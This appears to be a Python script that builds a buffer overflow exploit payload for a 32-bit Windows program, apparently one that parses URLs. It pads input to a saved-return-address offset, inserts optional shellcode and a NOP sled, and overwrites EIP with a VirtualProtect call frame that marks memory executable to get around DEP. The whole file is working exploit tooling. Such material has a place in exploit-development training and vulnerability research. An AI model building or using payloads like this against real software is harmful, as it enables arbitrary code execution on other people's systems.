from __future__ import annotations

import argparse
from pathlib import Path
from struct import pack


def parse_int(value: str) -> int:
    return int(value, 0)


def add_args(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--prefix", default="http://")
    parser.add_argument("--offset", type=int, required=True)
    parser.add_argument(
        "--virtualprotect",
        type=parse_int,
        required=True,
        help="VirtualProtect address or IAT thunk to place at saved EIP",
    )
    parser.add_argument(
        "--return-addr",
        type=parse_int,
        required=True,
        help="Address reached after VirtualProtect returns",
    )
    parser.add_argument(
        "--lp-address",
        type=parse_int,
        required=True,
        help="lpAddress argument for VirtualProtect",
    )
    parser.add_argument(
        "--size",
        type=parse_int,
        default=0x201,
        help="dwSize argument for VirtualProtect (default: 0x201)",
    )
    parser.add_argument(
        "--protect",
        type=parse_int,
        default=0x40,
        help="flNewProtect argument (default: 0x40 PAGE_EXECUTE_READWRITE)",
    )
    parser.add_argument(
        "--writable",
        type=parse_int,
        required=True,
        help="Writable address for lpflOldProtect",
    )
    parser.add_argument(
        "--post-pad",
        type=int,
        default=1024,
        help="C bytes after the VirtualProtect frame (default: 1024)",
    )
    parser.add_argument(
        "--pre-nops",
        type=int,
        default=0,
        help="NOP sled placed before saved EIP, inside the pre-offset region",
    )
    parser.add_argument(
        "--shellcode-file",
        type=Path,
        help="Raw shellcode bytes to place before saved EIP, before --pre-nops",
    )


def read_shellcode(path: Path | None) -> bytes:
    if path is None:
        return b""
    return path.read_bytes()


def build(args: argparse.Namespace) -> bytes:
    if args.offset < 0:
        raise ValueError("--offset must be zero or greater")
    if args.pre_nops < 0 or args.post_pad < 0:
        raise ValueError("--pre-nops and --post-pad must be zero or greater")

    shellcode = read_shellcode(args.shellcode_file)
    pre_used = len(shellcode) + args.pre_nops
    if pre_used > args.offset:
        raise ValueError(
            f"pre-EIP shellcode/NOPs need {pre_used} bytes but offset is {args.offset}"
        )

    prefix = args.prefix.encode("latin-1")
    pre_eip = b"A" * (args.offset - pre_used)
    pre_eip += shellcode
    pre_eip += b"\x90" * args.pre_nops

    frame = b""
    frame += pack("<I", args.virtualprotect)
    frame += pack("<I", args.return_addr)
    frame += pack("<I", args.lp_address)
    frame += pack("<I", args.size)
    frame += pack("<I", args.protect)
    frame += pack("<I", args.writable)

    return prefix + pre_eip + frame + (b"C" * args.post_pad)
